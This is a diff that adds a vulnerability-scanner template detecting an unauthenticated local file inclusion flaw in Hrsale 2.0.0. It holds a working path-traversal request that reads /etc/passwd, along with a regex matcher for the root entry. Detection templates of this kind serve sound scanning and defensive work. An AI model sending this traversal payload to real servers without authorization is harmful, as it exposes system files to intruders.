@@ -1,0 +1,29 @@
+id: "hrsale-unauthenticated-lfi"
+name: "Hrsale 2.0.0 - Local File Inclusion"
+severity: "high"
+description: "Hrsale 2.0.0 is vulnerable to local file inclusion. This exploit allow you to download any readable file from server without permission and login session"
+tech:
+  - "generic"
+tags:
+  - "hrsale"
+  - "lfi"
+  - "edb"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://www.exploit-db.com/exploits/48920"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/download?type=files&filename=../../../../../../../../etc/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:[x*]:0:0"
+  - type: "status"
+    status:
+      - 200
